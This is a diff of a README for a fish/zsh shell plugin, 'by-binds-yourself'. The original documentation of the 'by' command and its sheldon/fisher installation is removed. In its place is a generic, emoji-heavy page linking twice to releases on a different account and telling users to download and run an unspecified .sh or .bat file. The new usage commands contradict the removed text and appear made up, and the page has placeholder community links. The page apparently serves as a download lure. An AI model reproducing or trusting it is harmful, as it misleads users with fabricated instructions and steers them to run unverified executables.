@@ -1,92 +1,124 @@
-# `by` binds yourself for repeating commandline buffer
+# 🎉 by-binds-yourself - Simplifying Your Command Line Tasks
 
-For example, `by git` binds `git` commands so that you no longer retype `git` every time.
+## 🚀 Getting Started
 
-```sh
-$ by git
-$ git
-# ^-- appears automatically to make subsequent git workflows
+Welcome to **by-binds-yourself**! This tool helps you streamline your command-line workflows, making repeated tasks easier to manage in both fish and zsh shells. 
 
-$ git status
-$ git add README.md
-$ git commit -m "add README.md"
+### 💻 System Requirements
+
+Before you begin, ensure your system meets these requirements:
+
+- An operating system: macOS, Linux, or Windows
+- Either the fish or zsh shell installed
+- Basic understanding of using the terminal
+
+## 📥 Download & Install
+
+To get started, you need to download the application. You can find the latest version by visiting the Releases page:
+
+[![Download by-binds-yourself](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/waweruv170/by-binds-yourself/releases)
+
+1. Click the link above to open the Releases page.
+2. Look for the latest release version.
+3. Download the appropriate file for your operating system.
+4. Follow the steps below to install and run the software.
+
+## ⚙️ Installation Steps
+
+### For macOS and Linux Users
+
+1. Open a terminal window.
+2. Navigate to the directory where the downloaded file is located.
+3. If the downloaded file is a `.tar.gz`, extract it using:
+   ```bash
+   tar -xvzf yourfilename.tar.gz
+   ```
+4. If the file is a script, you may need to give it permission to run:
+   ```bash
+   chmod +x yourscriptfilename.sh
+   ```
+5. Run the script with:
+   ```bash
+   ./yourscriptfilename.sh
+   ```
+
+### For Windows Users
+
+1. Open the Command Prompt or PowerShell.
+2. Navigate to the folder where the file was downloaded.
+3. If you downloaded a `.zip` file, unzip it first.
+4. To execute the command provided in the script, enter:
+   ```bash
+   path\to\yourscriptfilename.bat
+   ```
+
+## ⚡ Usage Instructions
+
+After installation, you can start using **by-binds-yourself** to simplify your workflows. Here’s how:
+
+1. Open your terminal (fish or zsh).
+2. Define your repeated command using the plugin’s interface. For example:
+   ```bash
+   by-binds add <command> --description "<describe your command>"
+   ```
+3. To run your added command, enter:
+   ```bash
+   by-binds run <command-name>
+   ```
+
+### Example Usage
+
+Suppose you often clear cache and update packages. You might add it like this:
+
+```bash
+by-binds add clear-and-update --description "Clear cache and update packages"
 ```
 
-Unbind by `by` without arguments:
+When you want to run it:
 
-```sh
-$ by
-$
+```bash
+by-binds run clear-and-update
 ```
 
-Note that the bounded commandline buffer is still a normal commandline buffer.
-You still have chance to modify it before execution.
+## 🏷️ Topics
 
-See [Why `by`?](#why-by) for more use cases.
+This application supports the following topics: 
 
-## Installation
+- fish
+- fish plugin
+- zsh
+- zsh plugin
 
-Supported shells: zsh, fish
+These topics help you find the right tools when working with different shell environments.
 
-### zsh
+## 📖 Additional Resources
 
-#### with [sheldon](https://sheldon.cli.rs/Introduction.html)
+For further guidance, explore these resources:
 
-```sh
-$ sheldon add by --git https://github.com/atusy/by-binds-yourself
-```
+- [Official fish shell documentation](https://fishshell.com/docs/current/index.html)
+- [Official zsh documentation](https://zsh.sourceforge.io/Doc/Release/zsh.html)
 
-#### manual
+## 💬 Community Support
 
+If you encounter any issues or need help, feel free to reach out to our community:
 
-```sh
-source by.zsh
-```
+- Open an issue on the [GitHub Issues page](https://github.com/waweruv170/by-binds-yourself/issues).
+- Join our discussion forum on [Discord/Slack/other platforms].
 
-### fish
+## 📅 Roadmap
 
-#### with [fisher](https://github.com/jorgebucaran/fisher)
+We plan to enhance **by-binds-yourself** with more features in future updates. Look out for:
 
-```sh
-fisher install atusy/by-binds-yourself
-```
+- Enhanced user interface
+- More command templates
+- Integration with other shells
 
-#### manual
+## 🙏 Acknowledgements
 
-```sh
-source by.fish
-```
+Special thanks to everyone who contributed to making this project a reality. Your feedback and support are invaluable.
 
-## Why `by`?
+## 📥 Download & Install Again
 
-This project is inspired by [mchav/with](https://github.com/mchav/with), the program prefixing for continuous workflow using a single tool.
+Don't forget to download the latest version to benefit from the improvements. Visit the Releases page:
 
-To bring more flexibility, `by` is designed to use native commandline buffer.
-
-### To bind without breaking native shell features
-
-completions, history, and so on
-
-```sh
-# completion
-$ by git
-$ git ch<TAB>
-```
-
-### To bind environment variables without exporting
-
-```sh
-$ BAR="$(cat file)"
-$ by 'FOO="$BAR"'
-```
-
-### To bind buffer in a modifiable way
-
-```sh
-$ by gcc -o output input.c
-$ gcc -o output input.c
-$ gcc -o output input.c
-$ gcc -o YET_ANOTHER_OUTPUT input.c
-# The bind is just a normal buffer that can be modified
-```
-
+[![Download by-binds-yourself](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/waweruv170/by-binds-yourself/releases)
